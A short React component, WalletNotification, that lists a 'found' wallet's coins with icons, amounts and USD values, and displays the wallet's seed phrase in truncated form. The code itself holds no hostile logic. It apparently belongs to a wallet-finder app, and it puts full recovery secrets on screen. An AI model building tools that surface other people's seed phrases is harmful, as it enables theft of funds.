const WalletNotification = ({ isDarkMode, foundWallet, cryptoPrices, currencySymbol }) => {
  if (!foundWallet || !cryptoPrices) return null;
  
  return (
    <div className={`mb-3 px-4 py-2.5 flex items-center gap-3 ${isDarkMode ? 'text-white' : 'text-gray-800'}`}>
      <div className="flex-1 whitespace-nowrap overflow-hidden">
        {foundWallet.coins && foundWallet.coins.map((coin, index) => {
          if (!coin || !coin.symbol || !coin.amount) return null;
          
          const price = cryptoPrices[coin.symbol]?.USD || 0;
          const usdValue = price * parseFloat(coin.amount);
          
          return (
            <span key={`${coin.symbol}-${index}`} className="flex items-center">
              {index > 0 && <span className="mx-2 opacity-50">•</span>}
              <img 
                src={`/assets/coins/${coin.symbol.toLowerCase()}.png`}
                alt={coin.symbol}
                className="w-5 h-5 mr-2"
              />
              <span className="font-medium">
                {parseFloat(coin.amount).toFixed(3)} {coin.symbol}
                <span className="ml-1 opacity-75">
                  ({currencySymbol}{usdValue.toFixed(2)})
                </span>
              </span>
            </span>
          );
        })}
        {foundWallet.seed_phrase && (
          <>
            <span className="mx-2 opacity-50">•</span>
            <span className="text-sm opacity-60 truncate after:content-['...']">
              {foundWallet.seed_phrase}
            </span>
          </>
        )}
      </div>
    </div>
  );
};

export default WalletNotification;